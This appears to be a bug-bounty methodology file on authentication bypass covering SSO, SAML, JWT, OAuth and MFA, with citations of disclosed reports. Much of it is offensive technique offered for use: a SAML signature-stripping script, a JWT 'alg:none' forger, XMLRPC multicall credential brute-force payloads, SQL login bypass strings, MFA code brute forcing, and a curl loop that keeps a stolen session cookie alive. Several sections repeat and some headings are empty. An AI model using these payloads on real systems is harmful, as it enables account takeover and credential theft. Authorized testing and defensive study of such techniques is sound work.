2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Step-skip: after the password step, forcefully browse to a "logged-in only" URL; a pre-MFA cookie often already satisfies session middleware.
- Cookie-identity swap: log in as `wiener`, then on `POST /login2` change `Cookie: verify=wiener` → `verify=carlos`. First replay `GET /login2` with the swapped cookie to make the server *issue* a code for carlos, then brute `mfa-code` 0000-9999 with a re-login macro (max concurrent 1) or Turbo Intruder.
- SQL/NoSQL login bypass: `' OR '1'='1`, `admin'--`, duplicate params `username=admin&username=guest&password=x`.
- Login CSRF: auto-submitting form logs the victim into an account you control; anything they type afterwards is saved there.
- Dynamic Client Registration SSRF (PortSwigger research): `POST /connect/register` with `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris` pointing at Collaborator; trigger second-order fetches via `/api/clients/{id}/logo`, `/token` with a `client_assertion`, or `/authorize?...&request_uri=...`.
- redirect_uri session poisoning: load a trusted `/authorize?client_id=...&redirect_uri=<trusted>&prompt=consent`, then a hidden cross-origin `/oauth/confirm_access?client_id=...&redirectUri=<evil>` (Spring `@ModelAttribute` mass assignment) — the approval leaks the code to the attacker.
- WebFinger enumeration/LDAPi: `/.well-known/webfinger?resource=http://x/dsa*&rel=http://openid.net/specs/connect/1.0/issuer` → 200/404 oracle; `dsameuser)(sunKeyValue=userPassword=A*)(...)` extracts attributes char-by-char.
- Extract `client_secret` from APK/IPA/Electron bundles and brute `/token`; treat public/native clients as incapable of holding secrets and test whether the backend requires PKCE.
- Frontend-only SSO gate: patch `getAllAccounts()` or overwrite `localStorage` identity fields, then call the API with no/garbage bearer token to prove no server-side validation.
- Response tampering on the client: `{"success":false}` → `true`, 403 → 200, or `requires_2fa` → false; also try `Response` replay patterns.

- Single-packet MFA sub-state race: send `POST /login` together with a request to a sensitive authenticated endpoint over HTTP/2, using Turbo Intruder's `Engine.BURP2`, `concurrentConnections=1`, and a named `gate`/`openGate` — a 200 on the protected endpoint proves the hidden sub-state is reachable.
- Replay-capture bypass: record a valid login response (cookies/tokens) and replay it verbatim in a fresh session (HackerOne #3120790) — this tests whether the server keeps any state tying the token to the original client.
- Empty-password / alternate-parameter trick: an XML-based login can accept `password=""` or a second `password` field, and a refresh endpoint may issue a token for any `username` supplied (Synack roundup).
- NameID/assertion-level bypasses: stripping `<ds:Signature>`, altering `NameID`, or using a parser differential (CVE-2025-25291) on the SAML path — hand off to the `saml` skill for the XML mechanics, but treat it as an auth-bypass primitive here.
- Token-audience confusion: present a token minted for service A to service B's API; if accepted, the trust boundary between services is broken even though no signature was forged (Argo CD CVE-2023-22482 pattern).
- Login-timing oracle chain: enumerate a valid username via timing (response delay grows with password length), then use that certainty to focus a credential-stuffing or password-spray attack — the enumeration alone may be low, the chain is not.
- Header-spoofed localhost bypass: `X-Custom-IP-Authorization: 127.0.0.1` (discovered via `TRACE`) to reach an admin panel that allows local requests — PortSwigger information-disclosure-to-auth-bypass lab.
- Mobile/deep-link auth bypass: exported activities or URL schemes that accept a session token or user ID and land the attacker in an authenticated screen — see the `mobile` skill for component enumeration.
- Client-side-only re-auth: change a JS variable like `isAdmin=true`, `authenticated=true`, or patch a route guard, then replay the API call without the guard to show the server never enforced it.

### Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

### Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Distinguish auth bypass from IDOR/enumeration: prove a real authenticated state (cookie/JWT) and a state-changing action or foreign-data read, not just a 200 or a 401-vs-403 differential.
- For SSO/session-bootstrap bugs, decode the token only to record `sub`/role/issuer/audience/expiry and replay the *unaltered* token on normal APIs. Do not claim "JWT forgery" when the vulnerable app itself signed the attacker-chosen identity.
- For enumeration, show amplification (victim lockout, credential stuffing with real breach data), otherwise expect N/A/Informational.
- Confirm blind SSRF from dynamic registration with an out-of-band Collaborator hit, and remember the fetch may occur only at approval/token exchange, not at registration.
- Re-test persistence after logout and password change; verify with a second clean browser session. Never report a state-only OAuth "open redirect" as Critical without exchanging the code for a token.

- For timing-based enumeration, repeat each candidate several times and use a long static password (≈100 chars) so the length-dependent delay is measurable; rule out network jitter before claiming the oracle.
- A 200 from a "hidden" admin URL is not access — check the body contains privileged data or a working admin action; a login page rendered with 200 is not a bypass.
- For SSO parser differentials, require an actual login as a different user (ideally admin) on the target SP; a crafted SAMLResponse that only produces an error is not an auth bypass.
- For response-tampering bugs, note that the client-side check is the vulnerability — show the exact response that was modified and the resulting authenticated state; do not rely on a screenshot of a console log alone.
- Re-test each bypass after a password change and logout: many "bypasses" are just stale pre-auth cookies that the server later invalidates.
- When chaining to ATO, prove the full chain from attacker A to victim B (or to admin) in one clean walkthrough; a collection of isolated primitives is usually downgraded.
- Publicly disclosed 2025 research (GitHub Security Lab SAML parser differentials, PortSwigger Fragile Lock) shows these bugs are library/version-specific — record the detected version so triage can reproduce quickly.
- Keep scope discipline: default-credential and exposed-infrastructure findings need explicit authorization and a safe proof (e.g. reading a harmless version endpoint), not destructive admin actions.
- Redact session cookies, tokens, and other-user PII in all PoC material; a valid finding with sloppy evidence is frequently rejected for hygiene reasons.

### Escalation and related chains

### Escalation chains

- Reset poisoning -> ATO.
- JWT forgery -> admin access.
- OAuth redirect -> token theft.

### Chained Bugs to Leak Victim's Uber's FB Oauth Token

`#202781` · Uber · $0 · high · 2019-01-25 · ▲427
> The Facebook OAuth application was misconfigured to allow any URL that followed the https://auth.uber.com/login? format to be provided as a redirect uri. By taking advantage of this, @ngalog was able to discover that the next url parameter could be added to the redirect uri allowing it to be chained further.

### Attack class 1 — YARP `UserOrClient` / `UserOrNone` privilege escalation

`Duende.BFF.Yarp` attaches access tokens to proxied routes via `WithAccessToken(TokenType.X)` metadata. The **misconfig pattern**: developer marks a route `UserOrClient` (use user token if logged in, else fall back to *client-credentials* token) intending it for a "public catalog" endpoint. The client-credentials (M2M) token frequently has broader scope (`api.admin`, `internal.read`) than any user token. An **unauthenticated** attacker hitting that route gets the request proxied with the **service-account token attached** to the downstream API — privilege escalation by design when the downstream trusts the bearer.

**Payload shape:** identify a BFF route marked `TokenType.UserOrClient` (visible via 401-vs-200 differential when no session, or via leaked OpenAPI/NSwag spec). Hit it with no cookies → BFF forwards with M2M token granting admin-scope downstream. ([docs.duendesoftware.com/bff/fundamentals/apis/yarp](https://docs.duendesoftware.com/bff/fundamentals/apis/yarp/))

**Adjacent confirmed CVE:** **CVE-2024-51987** in `Duende.AccessTokenManagement.OpenIdConnect` — *"HTTP client uses incorrect token after refresh"* — materially the same family of token-confusion at the proxy layer. Moderate severity, fixed 2024. ([GHSA-...51987](https://github.com/advisories?query=duende))

### Related Skills & Chains

- **`idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
- **`account-takeover`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.

### Related Skills & Chains

- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.

### Tools and wordlists

### Tools

`jwt_tool` · `hashcat` · `Burp` · `ffuf` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_auth-bypass.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_auth-bypass.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_auth-bypass.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_auth-bypass.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Default-login templates are high signal on admin panels; also test JWT and reset flows manually.

```sh
nuclei -u https://target -tags auth-bypass,default-login,jwt,login \
       -severity low,medium,high,critical -rl 40 -o nuclei_auth-bypass.txt
nuclei -u https://target -t ~/nuclei-templates/http/default-logins \
       -rl 40 -o nuclei_auth-bypass_default-logins.txt
nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
       -rl 40 -o nuclei_auth-bypass_misconfiguration.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Real-world examples

### Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.

---

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class auth-bypass --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class auth-bypass
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class auth-bypass
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class auth-bypass --min-bounty 1000
```

### Related

- `hackerone-mfa-and-passwords` (285 reports)
- `hackerone-oauth-oidc` (177 reports)
- `hackerone-session` (150 reports)

### Related

- `mfa-and-passwords` (285 reports)
- `oauth-oidc` (177 reports)
- `session` (150 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/authentication/other-mechanisms
2. https://portswigger.net/web-security/authentication/multi-factor
3. https://portswigger.net/research/hidden-oauth-attack-vectors
4. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
5. https://portswigger.net/web-security/race-conditions

### Additional notes

### Parameters observed

`client_id` · `redirect_uri` · `state` · `code` · `email` · `response_type` · `error` · `consumer_key` · `host` · `scope` · `id` · `auth_type` · `referrer` · `password` · `client_secret` · `type` · `return_to` · `auth_code` · `page` · `ws`

### Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password

`#739737` · PayPal · $15,300 · high · 2020-01-08 · ▲1409
> A bug was identified whereby sensitive, unique tokens were being leaked in a JS file used by the recaptcha implementation. In certain cases, a user must solve a CAPTCHA challenge after authenticating. When the security challenge is completed, the authentication request is replayed to log in. The exposed tokens were used in the POST request to solve the CAPTCHA.

### Improper Authentication - any user can login as other user with otp/logout & otp/login

`#921780` · Snapchat · $0 · critical · 2021-09-03 · ▲972
> '/scauth/otp/droid/logout' request contains user id parameter. Usually it is equal to current user user id, but if an attacker passes user id of victim account he can login as victim. I will demonstrate the problem on two accounts. Victim: ███ Attacker: ██████████ - Attacker perform a usuall login to attacker's personal account.

### Flickr Account Takeover using AWS Cognito API

`#1342088` · Flickr · $0 · critical · 2021-12-18 · ▲440
> Flickr uses Amazon Cognito to implement its login functionality. Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito User Pool API. Consider we have the following accounts: 1. flickr-benign@lauritz-holtmann.de (our victim) 2.

### SSH certificate-authority trust forgery (Git-hosting / enterprise platforms)

When an org or instance registers an SSH certificate authority, cert `principals` may not be bound server-side to the requesting identity — a member can mint a cert asserting another user's principal and authenticate as them (e.g. modify another user's resource given only its URL). Add SSH-CA trust to the auth-surface list on Git-hosting targets; niche/platform-specific. Disclosed: reports/1901040.

### Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

### Disclosed Report Citations (Backfill +8 — 2016-2025)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans 4 SAML subclasses, 4 JWT subclasses, 1 legacy-protocol (XMLRPC), and 2 partner-portal cross-domain reuse patterns.

5. **GitHub Enterprise Server — SAML XSW via parser differential (CVE-2025-25291/25292)** ([H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/))
    - Subclass: SAML signature stripping / XSW (parser-differential variant)
    - Payload: signed SAML response; inject a sibling `<Assertion>` so REXML (signature-checker) and Nokogiri (business-logic reader) resolve different nodes via the same XPath. Signature validates against benign node; SP consumes attacker-controlled `<NameID>admin@target</NameID>`
    - Root cause: two XML parsers used for verification vs consumption return different elements for the same XPath
    - Year: 2025 — GitHub Security Lab bounty (program max class, internally rated Critical)

6. **GitHub Enterprise — SAML signature bypass on encrypted assertions (CVE-2024-4985)** ([H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass))
    - Subclass: SAML signature stripping (XSW family) when encrypted-assertions feature enabled
    - Payload: forge SAML response with attacker-controlled assertion; exploit improper signature verification on the encrypted-assertion code branch; provision arbitrary user including `site_admin`
    - Root cause: improper cryptographic signature verification on the encrypted-assertion code branch
    - Year: 2024 — bounty undisclosed, CVSS 10.0

7. **Uber — SAML auth bypass on `uchat.uberinternal.com`** ([H1 #223014](https://hackerone.com/reports/223014))
    - Subclass: SAML signature stripping / improper assertion verification (OneLogin SP-side)
    - Payload: replay/modify SAML assertion with forged `NameID`; SP did not strictly validate signature scope, so attacker-controlled assertion accepted, granting OneLogin SSO session to internal chat
    - Root cause: improper SAML signature verification on SP implementation
    - Year: 2017 — **$8,500**

8. **Uber — OneLogin SSO bypass via WordPress XMLRPC** ([H1 #138869](https://hackerone.com/reports/138869))
    - Subclass: WordPress XMLRPC bypassing SSO (legacy-auth path not gated) — canonical Legacy-Protocol Matrix case
    - Payload: OneLogin plugin auto-created WP users with literal password `@@@nopass@@@`. SSO plugin blocked `wp-login.php` only. POST `xmlrpc.php` with `wp.getUsersBlogs` + known shared password → authenticated as any previously-SSO'd user
    - Root cause: SSO enforcement applied at one auth surface (wp-login) but legacy XML-RPC path retained password auth with a guessable shared password
    - Year: 2016 — **$7,000**

9. **Slack — SAML "confused-deputy" assertion reuse** ([Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html))
    - Subclass: partner-portal / cross-IdP assertion reuse (audience-restriction not validated)
    - Payload: take an old expired GitHub-signed SAML assertion (different audience, different subject) → present to Slack ACS → Slack logs attacker in as the asserted username
    - Root cause: no audience-restriction nor freshness check; trust extended across IdPs
    - Year: 2017 — **$3,000**

10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
    - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, `\x00`) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
    - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
    - Year: 2024 — bounty awarded (amount undisclosed)

11. **8x8 / Jitsi-Meet — JWT alg-confusion (asymmetric verifier accepts symmetric alg)** ([H1 #1210502](https://hackerone.com/reports/1210502))
    - Subclass: JWT alg-confusion (RS256 → HS256 using public key as HMAC secret)
    - Payload: server publishes RS256 verification public key. Send a token with header `{"alg":"HS256"}` signed with that public key as the HMAC secret → Prosody module validates and admits attacker into authenticated/moderator room
    - Root cause: verifier did not enforce `alg=RS256`; allowed symmetric algorithm using the public key as shared secret
    - Year: 2021 — bounty undisclosed

12. **Argo CD (Internet Bug Bounty) — JWT audience claim not validated (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161))
    - Subclass: token-scope / audience check at issuance not at use (cross-audience token confusion)
    - Payload: obtain any RS256-signed token signed by the cluster's OIDC issuer but minted for a different `aud` (e.g., `kubernetes`) → present it as bearer to Argo CD API → API treats it as valid because it accepted the issuer's signature and skipped `aud` enforcement
    - Root cause: `aud` claim not enforced; signature-trust extended across audiences
    - Year: 2023 — **$2,400** via IBB

---

### Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)

Duende BFF deployments expose two distinct auth-bypass families beyond the CSRF angle covered in `csrf`. Both are documented architectural realities, not unicorn CVEs.

### Attack class 2 — Cookie-domain wildcard + sliding expiration = persistent ATO

When BFF session cookie has `Domain=.example.com` (devs do this to share login across `app.` and `admin.`), the `__Host-` prefix protection is dropped. Any sibling subdomain — including a **taken-over** one (`legacy.example.com` CNAMEd to deprovisioned Heroku/S3) — can write `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com`. Victim hits `app.example.com` carrying the attacker's session = **session-fixation ATO**.

If `SlidingExpiration=true` (default) and `ExpireTimeSpan` is large (e.g. 8h), an exfiltrated cookie remains valid and keeps sliding forward as long as the attacker periodically calls `/bff/user`. There is no server-side refresh-token rotation check on the cookie itself — only the OIDC token (server-side) rotates. Persistent ATO window per stolen cookie.

**Payload shape:** subdomain takeover → write the BFF session cookie with `Domain=.example.com` → victim's next visit to `app.example.com` adopts attacker's session. Cron-curl `GET /bff/user -H 'X-CSRF: 1' -b '.AspNetCore.Cookies=...'` every 6h indefinitely to keep the session alive.

